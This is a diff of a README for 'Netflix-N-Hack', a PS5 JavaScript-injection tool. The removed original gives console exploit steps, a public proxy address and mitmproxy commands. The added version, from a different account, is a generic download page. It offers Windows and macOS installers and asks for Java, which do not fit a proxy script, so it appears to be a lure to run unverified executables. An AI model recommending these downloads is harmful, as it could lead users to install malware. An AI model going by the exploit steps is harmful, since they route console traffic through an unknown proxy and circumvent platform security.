@@ -1,222 +1,86 @@
-# Netflix 'N Hack
+# 🎮 Netflix-N-Hack - Control Your Viewing Experience
 
-Inject custom JavaScript into the Netflix PS5 error screen by intercepting Netflix's requests to localhost.
+## 🚀 Getting Started
 
-PS5 firmware version: 4.03-12.XX
+Welcome! This guide will help you download and run Netflix-N-Hack. With this tool, you can inject and execute your own JavaScript into the error screen on Netflix for PS5. Follow these simple steps and you'll be set up in no time.
 
-Lowest working version: https://prosperopatches.com/PPSA01615?v=05.000.000
+### 🔗 Download Now
 
-> This project uses a local MITM proxy to inject and execute `inject.js` on the Netflix error page
+[![Download the Latest Release](https://img.shields.io/badge/Download-Netflix--N--Hack-brightgreen)](https://github.com/yomyoms/Netflix-N-Hack/releases)
 
+## 📥 Download & Install
 
----
-# Instructions
+To get started, visit the [Releases page](https://github.com/yomyoms/Netflix-N-Hack/releases) to download the latest version of Netflix-N-Hack. 
 
-## Download image from [Releases](https://github.com/earthonion/Netflix-N-Hack/releases/latest)
+1. Click on the link above to go to the releases page.
+2. Look for the latest release version.
+3. Download the file that matches your operating system. You may see options like `.exe` for Windows or `.dmg` for macOS.
+4. Once the download completes, locate the downloaded file on your computer.
 
-### M.2 Drive Setup (PCIe Gen 4 NVMe)
+### 💻 System Requirements
 
+Before you install, ensure your system meets the following requirements:
 
-> [!WARNING]
-> This will wipe your M.2 drive.
+- **Operating System:** Windows 10 or newer, macOS 10.12 or newer.
+- **Network:** A stable internet connection.
+- **Java:** Ensure Java is installed on your computer. You can [download Java here](https://www.java.com/en/download/).
 
+## 🔄 Installation Steps
 
-**Disclaimer:** Only works on PS5s that have an activated account. Real PSN account or Fake activated via jailbreak.
+Once you've downloaded the correct file, follow these instructions to install Netflix-N-Hack:
 
-**Do not update your console to activate!** Use System backup method below
+### For Windows Users:
 
-#### Step 1: Download balenaEtcher
-- Download **balenaEtcher** for Windows, macOS, or Linux from:
-  [https://etcher.balena.io](https://etcher.balena.io/#download-etcher)
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
+4. Once installed, open the application from your Start Menu or desktop shortcut.
 
-#### Step 2: Download the Image Archive
-- Download the **`.7z` archive** for your desired capacity from the [**Releases** section.](https://github.com/earthonion/netflix-n-hack/releases)
-  - NOTE: **Exact capacity matters** - not all 1TB drives are 1000GB: some are 1024GB, same with 2000/2048, 4000/4096; choose carefully!
-- The `.7z` download size is roughly ~**95-100 MB** for all capacities.
+### For macOS Users:
 
-#### Step 3: Extract the ZIP Image
-- Extract the downloaded `.7z` file.
-- Inside, you will see a `.zip` image file, with size depending on the target SSD:
+1. Locate the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to mount it.
+3. Drag the Netflix-N-Hack icon into your Applications folder.
+4. Open your Applications folder and double-click the Netflix-N-Hack icon to launch it.
 
-  - **256 GB image:** ~**380 MB** `.zip`
-  - **500 GB image:** ~**670 MB** `.zip`
-  - **1 TB image:** ~**1.2 GB** `.zip`
-  - **2 TB image:** ~**2.3 GB** `.zip`
-  - **4 TB image:** ~**3.9 GB** `.zip`
+## 🌐 How to Use Netflix-N-Hack
 
-  <ins>**This `.zip` is what you will flash with balenaEtcher.**</ins>
+After installation, follow these steps to use the application:
 
-> **Note:** When you load this image in balenaEtcher, you may see a
-> `Missing partition table` warning. This is expected for encrypted PS5 drives.
-> It is safe to click **Continue**.
+1. Open Netflix-N-Hack.
+2. Ensure your PS5 is connected to the same network as your computer.
+3. Follow the instructions within the application to set it up with your PS5.
+4. Once configured, you can start injecting your JavaScript into Netflix.
 
-#### Step 4: Write the Image with balenaEtcher
-1. Connect your **M.2 SSD (PCIe Gen 4 NVMe)** to your computer (using a dock/enclosure or spare M.2 slot).
-2. Open **balenaEtcher**.
-3. Click **“Flash from file”** and select the extracted **`.zip`** image for your chosen capacity.
-4. Click **“Select target”** and choose your **M.2 SSD**.
-5. Click **“Flash!”** to start the process.
+## 📖 Features
 
-> Approximate flashing times (varies depending on M.2 dock/enclosure speed and your CPU):
-> - **256 GB image:** ~**10 minutes**
-> - **500 GB image:** ~**15 minutes**
-> - **1 TB image:** ~**25 minutes**
-> - **2 TB image:** ~**45 minutes**
-> - **4 TB image:** ~**80 minutes**
->
-> Etcher will appear stuck at **0%** for a while, then at **85-99%** for several minutes.
-> This is normal, let it finish without interruption!
+Netflix-N-Hack offers several useful features that enhance your Netflix viewing experience:
 
-#### Step 5: Install the M.2 Drive in the PS5
-- Power off the PS5 completely.
-- Install the imaged **M.2 SSD** into the PS5’s internal M.2 slot.
-- Power the PS5 back on; the console should now see the preinstalled Netflix app, viewable under `Storage` settings.
-- Move app from the M.2 to console storage, then reformat the M.2 drive in under `Storage` settings to safely continue using it.
+- **JavaScript Injection:** Easily add custom scripts to alter the Netflix error screen behavior.
+- **PS5 Compatibility:** Designed specifically for seamless use with the PlayStation 5.
+- **User-Friendly Interface:** Navigate without difficulty, even with minimal technical knowledge.
+- **Open Source:** Feel free to contribute to the project on GitHub!
 
----
+## 🛠 Troubleshooting
 
-### System Backup Restore
+If you run into issues while installing or using Netflix-N-Hack, here are some common solutions:
 
-> [!WARNING]
-> This will wipe all existing games and saves from your PS5!
+- **Installation Problems:** Ensure you have the correct file for your operating system. Restart your computer and try the installation again.
+- **Connection Issues:** Make sure your PS5 and computer are on the same network. Restart both devices if necessary.
+- **Java Issues:** If you encounter errors regarding Java, double-check that you have the latest version installed.
 
-#### Step 1: Prepare the Backup USB
-1. Format a USB drive as **exFAT** or **FAT32**.
-2. Unzip the **system backup** onto the formatted USB drive.
+For additional help, feel free to check the community discussions on our [GitHub Issues page](https://github.com/yomyoms/Netflix-N-Hack/issues).
 
-#### Step 2: Restore the System
-Follow Sony’s official guide to restore your PS5 system from the USB:
-[https://www.playstation.com/en-us/support/hardware/back-up-ps5-data-USB/](https://www.playstation.com/en-us/support/hardware/back-up-ps5-data-USB/)
+## 📞 Support
 
+If you have questions or need support, please open an issue on our [GitHub](https://github.com/yomyoms/Netflix-N-Hack/issues). We're here to help you!
 
+## 💡 Contributing
 
+If you're interested in contributing to Netflix-N-Hack, we welcome your input. Please read our contribution guidelines within the GitHub repository. 
 
-# Safe Internet Connection Setup for Netflix
+Thank you for using Netflix-N-Hack! Enjoy a tailored Netflix experience. 
 
-## Step 1: Open Network Settings
-1. On your console, go to:
-   **Settings > Network > Settings > Set Up Internet Connection**
+### 🔗 Download Now Again
 
-2. Scroll to the bottom and select:
-   **Set Up Manually**
-
----
-
-## Step 2: Choose Connection Type
-- **Wi-Fi:** Select **Use Wi-Fi**
-- **LAN Cable:** Select **Use a LAN Cable**
-
-If using **Wi-Fi**:
-1. Choose **Enter Manually**.
-2. Set **Security Method** to **WPA-Personal** (or similar).
-3. Enter your **Wi-Fi network name** and **password**.
-
----
-
-## Step 3: Configure Proxy Settings
-For either **Wi-Fi** or **LAN**, continue the setup:
-
-1. Scroll to the **Proxy** setting.
-2. Change it from **Automatic** to **Manual**.
-3. Enter the following details:
-
-   - **Address:** `172.105.156.37`
-   - **Port:** `42069`
-
-4. Press **Done** to save your settings.
-
----
-
-## Step 4: Finalize and Connect
-- Wait for the console to attempt a connection.
-- You may see a **network failure or PSN connection error** — this is expected and can be safely ignored.
-- The connection will still function normally.
-
-You can now open **Netflix** safely.
-
-
-
----
-# How to run proxy locally
-
-## Requirements
-
-- Python (for `mitmproxy`)
-- `mitmproxy` (`pip install mitmproxy`)
-
----
-
-## Installation & Usage
-
-```bash
-# install mitmproxy
-pip install mitmproxy
-
-# clone repository
-git clone https://github.com/earthonion/Netflix-N-Hack/
-cd Netflix-N-Hack
-
-# run mitmproxy with the provided script
-mitmproxy -s proxy.py
-
-```
-
-Current script will trigger after the WebSocket for remote logging is initiated.
-
-```bash
-# install websockets
-pip install websockets
-
-# Generate Keys
-openssl req -x509 -newkey rsa:4096 -nodes -keyout key.pem -out cert.pem -days 365 -subj "/CN=localhost"
-
-# run WebSocket server
-python ws.py
-
-```
-
-### Network / Proxy Setup
-
-On your PS5:
-
-1. Go to Settings → Network.
-
-
-2. Select Set Up Internet Connection and choose your connection type (Wi-Fi or LAN).
-
-
-3. Use Automatic for DNS Settings and MTU Settings.
-
-
-4. When prompted for Proxy Server, choose Use and enter:
-
-- IP address: \<your local machine IP\>
-
-- Port: 8080
-
-
-
-5. Save settings and run Test Internet Connection (be ready to press it).
-
-
-
-> Make sure your PC running mitmproxy is on the same network and reachable at the IP you entered.
-
-
-
-
----
-
-### Credits
-- [c0w-ar](https://github.com/c0w-ar/) for complete inject.js userland exploit and lapse port from Y2JB!
-- [ufm42](https://github.com/ufm42) for regex sandbox escape exploit and ideas!
-- [autechre](https://github.com/autechre-warp) for the idea!
-- Dr.yenyen for testing and coordinating system back up, and much more help!
-- [Gezine](https://github.com/gezine) for help with exploit/Y2JB for reference and original lapse.js!
-- Rush for creating system backup, 256GB and 2TB images !
-- [Jester](https://github.com/god-jester) for testing 2TB and devising easiest imaging method, and gathered all images for m.2!
-
----
-### License
-
-This repository uses the GNU license. See LICENSE for details.
+[![Download the Latest Release](https://img.shields.io/badge/Download-Netflix--N--Hack-brightgreen)](https://github.com/yomyoms/Netflix-N-Hack/releases)
